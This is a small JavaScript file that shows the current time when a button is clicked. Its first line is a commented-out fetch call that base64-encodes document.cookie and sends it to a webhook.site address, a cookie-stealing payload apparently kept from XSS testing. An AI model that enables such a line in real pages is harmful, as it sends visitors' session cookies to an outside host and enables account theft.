//fetch("https://webhook.site/79454414-22d3-4310-af53-9c8f88cd6f7d?"+window.btoa(document.cookie))

document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    displayCurrentTime();
  });

  function displayCurrentTime() {
    const now = new Date();
    const timeString = now.toLocaleTimeString();
    document.getElementById("timeDisplay").innerText =
      "現在時間: " + timeString;
  }
});
